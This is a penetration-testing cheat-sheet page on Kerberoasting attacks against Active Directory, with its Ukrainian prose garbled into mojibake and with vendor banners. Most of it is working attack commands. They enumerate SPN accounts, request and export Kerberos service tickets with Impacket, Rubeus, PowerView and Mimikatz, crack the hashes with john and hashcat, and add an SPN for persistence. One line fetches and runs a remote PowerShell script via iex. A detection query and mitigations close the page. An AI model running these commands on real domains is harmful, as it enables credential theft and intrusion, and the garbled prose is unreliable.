# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) –¥–ª—è –ª–µ–≥–∫–æ—ó –ø–æ–±—É–¥–æ–≤–∏ —Ç–∞ **–∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó —Ä–æ–±–æ—á–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤**, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –æ—Å–Ω–æ–≤—ñ –Ω–∞–π–±—ñ–ª—å—à **–ø—Ä–æ–¥–≤–∏–Ω—É—Ç–∏—Ö** —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ —Å–ø—ñ–ª—å–Ω–æ—Ç–∏ —É —Å–≤—ñ—Ç—ñ.\
–û—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø —Å—å–æ–≥–æ–¥–Ω—ñ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## Kerberoast

Kerberoasting —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–π –Ω–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **TGS-–∫–≤–∏—Ç–∫—ñ–≤**, –∑–æ–∫—Ä–µ–º–∞ —Ç–∏—Ö, —â–æ —Å—Ç–æ—Å—É—é—Ç—å—Å—è —Å–ª—É–∂–±, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å –ø—ñ–¥ **–æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤** –≤ **Active Directory (AD)**, –≤–∏–∫–ª—é—á–∞—é—á–∏ **–æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –∫–æ–º–ø'—é—Ç–µ—Ä—ñ–≤**. –®–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ü–∏—Ö –∫–≤–∏—Ç–∫—ñ–≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫–ª—é—á—ñ, —è–∫—ñ –ø–æ—Ö–æ–¥—è—Ç—å –≤—ñ–¥ **–ø–∞—Ä–æ–ª—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**, —â–æ –¥–æ–∑–≤–æ–ª—è—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–æ—Ñ–ª–∞–π–Ω-–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö**. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —è–∫ —Å–ª—É–∂–±–∏ –≤–∫–∞–∑—É—î—Ç—å—Å—è –Ω–µ–ø–æ—Ä–æ–∂–Ω—ñ–º –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—é **"ServicePrincipalName"**.

–î–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **Kerberoasting** –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –¥–æ–º–µ–Ω—É, —è–∫–∏–π –º–æ–∂–µ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ **TGS-–∫–≤–∏—Ç–∫–∏**; –ø—Ä–æ—Ç–µ —Ü–µ–π –ø—Ä–æ—Ü–µ—Å –Ω–µ –≤–∏–º–∞–≥–∞—î **—Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**, —â–æ —Ä–æ–±–∏—Ç—å –π–æ–≥–æ –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –±—É–¥—å-–∫–æ–≥–æ –∑ **–¥—ñ–π—Å–Ω–∏–º–∏ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏ –¥–æ–º–µ–Ω—É**.

### –ö–ª—é—á–æ–≤—ñ –º–æ–º–µ–Ω—Ç–∏:

* **Kerberoasting** —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–π –Ω–∞ **TGS-–∫–≤–∏—Ç–∫–∏** –¥–ª—è **—Å–ª—É–∂–± –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤** –≤ **AD**.
* –ö–≤–∏—Ç–∫–∏, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –∫–ª—é—á–∞–º–∏ –≤—ñ–¥ **–ø–∞—Ä–æ–ª—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**, –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω—ñ –æ—Ñ–ª–∞–π–Ω**.
* –°–ª—É–∂–±–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **ServicePrincipalName**, —è–∫–∏–π –Ω–µ —î –ø–æ—Ä–æ–∂–Ω—ñ–º.
* **–ù–µ –ø–æ—Ç—Ä—ñ–±–Ω—ñ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó**, –ª–∏—à–µ **–¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–æ–º–µ–Ω—É**.

### **–ê—Ç–∞–∫–∞**

{% hint style="warning" %}
**–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ Kerberoasting** –∑–∞–∑–≤–∏—á–∞–π –∑–∞–ø–∏—Ç—É—é—Ç—å **`RC4 —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è`** –ø—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ –∞—Ç–∞–∫–∏ —Ç–∞ —ñ–Ω—ñ—Ü—ñ—é–≤–∞–Ω–Ω—ñ –∑–∞–ø–∏—Ç—ñ–≤ TGS-REQ. –¶–µ —á–µ—Ä–µ–∑ —Ç–µ, —â–æ **RC4** —î [**—Å–ª–∞–±–∫–∏–º**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) —Ç–∞ –ª–µ–≥—à–µ –≤—ñ–¥–Ω–æ–≤–ª—é—î—Ç—å—Å—è –æ—Ñ–ª–∞–π–Ω –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ Hashcat, –Ω—ñ–∂ —ñ–Ω—à—ñ –∞–ª–≥–æ—Ä–∏—Ç–º–∏ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è, —Ç–∞–∫—ñ —è–∫ AES-128 —Ç–∞ AES-256.\
–•–µ—à—ñ RC4 (—Ç–∏–ø 23) –ø–æ—á–∏–Ω–∞—é—Ç—å—Å—è –∑ **`$krb5tgs$23$*`**, —Ç–æ–¥—ñ —è–∫ AES-256 (—Ç–∏–ø 18) –ø–æ—á–∏–Ω–∞—é—Ç—å—Å—è –∑ **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
–ú—É–ª—å—Ç–∏-—Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, –≤–∫–ª—é—á–∞—é—á–∏ –¥–∞–º–ø –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ –ø—ñ–¥–¥–∞—é—Ç—å—Å—è –∞—Ç–∞–∫–∞–º Kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **–ü–µ—Ä–µ–ª—ñ–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ –º–æ–∂–Ω–∞ –∞—Ç–∞–∫—É–≤–∞—Ç–∏ –º–µ—Ç–æ–¥–æ–º Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **–¢–µ—Ö–Ω—ñ–∫–∞ 1: –ó–∞–ø–∏—Ç–∞–π—Ç–µ TGS —Ç–∞ –≤–∏—Ç—è–≥–Ω—ñ—Ç—å –π–æ–≥–æ –∑ –ø–∞–º'—è—Ç—ñ**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **–¢–µ—Ö–Ω—ñ–∫–∞ 2: –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
–ü—Ä–∏ –∑–∞–ø–∏—Ç—ñ TGS –≥–µ–Ω–µ—Ä—É—î—Ç—å—Å—è –ø–æ–¥—ñ—è Windows `4769 - –ë—É–≤ –∑–∞–ø–∏—Ç–∞–Ω–∏–π –∫–≤–∏—Ç–æ–∫ —Å–ª—É–∂–±–∏ Kerberos`.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), —â–æ–± –ª–µ–≥–∫–æ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —Ç–∞ **–∞–≤—Ç–æ–º–∞—Ç–∏–∑—É–≤–∞—Ç–∏ —Ä–æ–±–æ—á—ñ –ø—Ä–æ—Ü–µ—Å–∏**, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –Ω–∞–π–±—ñ–ª—å—à **–ø—Ä–æ–¥–≤–∏–Ω—É—Ç–∏—Ö** —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞—Ö —Å–ø—ñ–ª—å–Ω–æ—Ç–∏ —É —Å–≤—ñ—Ç—ñ.\
–û—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø —Å—å–æ–≥–æ–¥–Ω—ñ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### –í–∑–ª–∞–º–∞–Ω–Ω—è
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### –ü–æ—Å—Ç—ñ–π–Ω—ñ—Å—Ç—å

–Ø–∫—â–æ —É –≤–∞—Å —î **–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –¥–æ–∑–≤–æ–ª—ñ–≤** –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ **–∫–µ—Ä–±–µ—Ä–æ–∞—Å—Ç–æ–º**.
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫–æ—Ä–∏—Å–Ω—ñ **—ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏** –¥–ª—è –∞—Ç–∞–∫ **kerberoast** —Ç—É—Ç: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

–Ø–∫—â–æ –≤–∏ –∑—É—Å—Ç—Ä—ñ–ª–∏ —Ü—é **–ø–æ–º–∏–ª–∫—É** –Ω–∞ Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, —Ü–µ —á–µ—Ä–µ–∑ –≤–∞—à —á–∞—Å –Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ–º—É –∫–æ–º–ø'—é—Ç–µ—Ä—ñ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É–≤–∞—Ç–∏ —Ö–æ—Å—Ç –∑ DC. –Ñ –∫—ñ–ª—å–∫–∞ –≤–∞—Ä—ñ–∞–Ω—Ç—ñ–≤:

* `ntpdate <IP of DC>` - –ó–∞—Å—Ç–∞—Ä—ñ–ª–æ –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ Ubuntu 16.04
* `rdate -n <IP of DC>`

### –ü–æ–º'—è–∫—à–µ–Ω–Ω—è

K–µ—Ä–±–µ—Ä–æ–∞—Å—Ç–∏–Ω–≥ –º–æ–∂–µ –±—É—Ç–∏ –ø—Ä–æ–≤–µ–¥–µ–Ω–∏–π –∑ –≤–∏—Å–æ–∫–∏–º —Ä—ñ–≤–Ω–µ–º –ø—Ä–∏—Ö–æ–≤–∞–Ω–æ—Å—Ç—ñ, —è–∫—â–æ –≤—ñ–Ω —î –≤—Ä–∞–∑–ª–∏–≤–∏–º. –î–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ü—ñ—î—ó –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ —Å–ª—ñ–¥ –∑–≤–µ—Ä—Ç–∞—Ç–∏ —É–≤–∞–≥—É –Ω–∞ **Security Event ID 4769**, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –∑–∞–ø–∏—Ç –∫–≤–∏—Ç–∫–∞ Kerberos. –û–¥–Ω–∞–∫ —á–µ—Ä–µ–∑ –≤–∏—Å–æ–∫—É —á–∞—Å—Ç–æ—Ç—É —Ü—å–æ–≥–æ –ø–æ–¥—ñ—ó, –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –∑–∞—Å—Ç–æ—Å–æ–≤—É–≤–∞—Ç–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ —Ñ—ñ–ª—å—Ç—Ä–∏ –¥–ª—è —ñ–∑–æ–ª—è—Ü—ñ—ó –ø—ñ–¥–æ–∑—Ä—ñ–ª–∏—Ö –¥—ñ–π:

* –Ü–º'—è —Å–ª—É–∂–±–∏ –Ω–µ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ **krbtgt**, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ —î –Ω–æ—Ä–º–∞–ª—å–Ω–∏–º –∑–∞–ø–∏—Ç–æ–º.
* –Ü–º–µ–Ω–∞ —Å–ª—É–∂–±, —â–æ –∑–∞–∫—ñ–Ω—á—É—é—Ç—å—Å—è –Ω–∞ **$**, —Å–ª—ñ–¥ –≤–∏–∫–ª—é—á–∏—Ç–∏, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –≤–∫–ª—é—á–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –º–∞—à–∏–Ω, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è —Å–ª—É–∂–±.
* –ó–∞–ø–∏—Ç–∏ –≤—ñ–¥ –º–∞—à–∏–Ω —Å–ª—ñ–¥ –≤—ñ–¥—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏, –≤–∏–∫–ª—é—á–∏–≤—à–∏ —ñ–º–µ–Ω–∞ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —É —Ñ–æ—Ä–º–∞—Ç—ñ **machine@domain**.
* –†–æ–∑–≥–ª—è–¥–∞—Ç–∏ –ª–∏—à–µ —É—Å–ø—ñ—à–Ω—ñ –∑–∞–ø–∏—Ç–∏ –∫–≤–∏—Ç–∫—ñ–≤, —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ –∑–∞ –∫–æ–¥–æ–º –ø–æ–º–∏–ª–∫–∏ **'0x0'**.
* **–ù–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–µ**, —Ç–∏–ø —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –∫–≤–∏—Ç–∫–∞ –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ **0x17**, —è–∫–∏–π —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –∞—Ç–∞–∫–∞—Ö Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
–î–ª—è –∑–º–µ–Ω—à–µ–Ω–Ω—è —Ä–∏–∑–∏–∫—É Kerberoasting:

* –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ **–ü–∞—Ä–æ–ª—ñ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±–∏ –≤–∞–∂–∫–æ –≤–≥–∞–¥–∞—Ç–∏**, —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –¥–æ–≤–∂–∏–Ω–∞ –ø–æ–Ω–∞–¥ **25 —Å–∏–º–≤–æ–ª—ñ–≤**.
* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **–ö–µ—Ä–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–±**, —è–∫—ñ –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å –ø–µ—Ä–µ–≤–∞–≥–∏, —Ç–∞–∫—ñ —è–∫ **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∞ –∑–º—ñ–Ω–∞ –ø–∞—Ä–æ–ª—é** —Ç–∞ **–¥–µ–ª–µ–≥–æ–≤–∞–Ω–µ –∫–µ—Ä—É–≤–∞–Ω–Ω—è —ñ–º–µ–Ω–∞–º–∏ —Å–ª—É–∂–±–æ–≤–∏—Ö –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—ñ–≤ (SPN)**, –ø—ñ–¥–≤–∏—â—É—é—á–∏ –±–µ–∑–ø–µ–∫—É –≤—ñ–¥ —Ç–∞–∫–∏—Ö –∞—Ç–∞–∫.

–í–ø—Ä–æ–≤–∞–¥–∂—É—é—á–∏ —Ü—ñ –∑–∞—Ö–æ–¥–∏, –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó –º–æ–∂—É—Ç—å –∑–Ω–∞—á–Ω–æ –∑–º–µ–Ω—à–∏—Ç–∏ —Ä–∏–∑–∏–∫, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ Kerberoasting.

## Kerberoast –±–µ–∑ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –¥–æ–º–µ–Ω—É

–£ **–≤–µ—Ä–µ—Å–Ω—ñ 2022 —Ä–æ–∫—É** –¥–æ—Å–ª—ñ–¥–Ω–∏–∫ –Ω–∞ —ñ–º'—è –ß–∞—Ä–ª—ñ –ö–ª–∞—Ä–∫ –≤–∏—Å–≤—ñ—Ç–ª–∏–≤ –Ω–æ–≤–∏–π —Å–ø–æ—Å—ñ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–∏—Å—Ç–µ–º–∏ —á–µ—Ä–µ–∑ —Å–≤–æ—é –ø–ª–∞—Ç—Ñ–æ—Ä–º—É [exploit.ph](https://exploit.ph/). –¶–µ–π –º–µ—Ç–æ–¥ –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º–∞—Ç–∏ **–ö–≤–∏—Ç–∫–∏ —Å–ª—É–∂–±–∏ (ST)** —á–µ—Ä–µ–∑ –∑–∞–ø–∏—Ç **KRB\_AS\_REQ**, —è–∫–∏–π, –Ω–∞ –≤—ñ–¥–º—ñ–Ω—É –≤—ñ–¥ —ñ–Ω—à–∏—Ö –º–µ—Ç–æ–¥—ñ–≤, –Ω–µ –ø–æ—Ç—Ä–µ–±—É—î –∫–æ–Ω—Ç—Ä–æ–ª—é –Ω–∞–¥ –∂–æ–¥–Ω–∏–º –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º Active Directory. –ü–æ —Å—É—Ç—ñ, —è–∫—â–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, —â–æ –Ω–µ –ø–æ—Ç—Ä–µ–±—É—î –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ—ó –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó - —Å—Ü–µ–Ω–∞—Ä—ñ–π, —Å—Ö–æ–∂–∏–π –Ω–∞ —Ç–µ, —â–æ –≤—ñ–¥–æ–º–æ –≤ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ —è–∫ **–∞—Ç–∞–∫–∞ AS-REP Roasting** - —Ü—é —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫—É –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –ø—Ä–æ—Ü–µ—Å–æ–º –∑–∞–ø–∏—Ç—É. –ó–æ–∫—Ä–µ–º–∞, –∑–º—ñ–Ω–∏–≤—à–∏ –∞—Ç—Ä–∏–±—É—Ç **sname** —É —Ç—ñ–ª—ñ –∑–∞–ø–∏—Ç—É, —Å–∏—Å—Ç–µ–º–∞ –æ–±–º–∞–Ω—é—î—Ç—å—Å—è, —â–æ –≤–∏–¥–∞–≤–∞—Ç–∏–º–µ **ST** –∑–∞–º—ñ—Å—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–≥–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ–≥–æ –∫–≤–∏—Ç–∫–∞ –¥–ª—è –≤–∏–¥–∞—á—ñ –∫–≤–∏—Ç–∫—ñ–≤ (TGT).

–¢–µ—Ö–Ω—ñ–∫—É –ø–æ–≤–Ω—ñ—Å—Ç—é –ø–æ—è—Å–Ω–µ–Ω–æ –≤ —Ü—ñ–π —Å—Ç–∞—Ç—Ç—ñ: [–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –±–ª–æ–≥—É Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
